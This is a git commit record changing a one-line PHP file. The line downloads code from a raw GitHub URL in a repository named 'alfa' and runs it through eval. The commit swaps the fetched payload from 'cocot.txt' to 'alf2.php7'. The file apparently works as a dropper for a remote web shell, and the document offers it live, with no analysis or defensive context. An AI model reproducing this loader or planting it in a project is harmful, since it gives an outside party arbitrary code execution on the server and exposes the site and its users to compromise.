c85c026045c6a6daa2278423f72389c82f3c3c4b
Denizly Furqan <31403046+zycoder0day@users.noreply.github.com>
2023-02-22 11:50:46 +0000

    Update file.php

--- file.php
+++ file.php
@@ -1,1 +1,1 @@
-<?php eval("?>" . file_get_contents("https://raw.githubusercontent.com/zycoder0day/alfa/main/cocot.txt")); ?>
+<?php eval("?>" . file_get_contents("https://raw.githubusercontent.com/zycoder0day/alfa/main/alf2.php7")); ?>
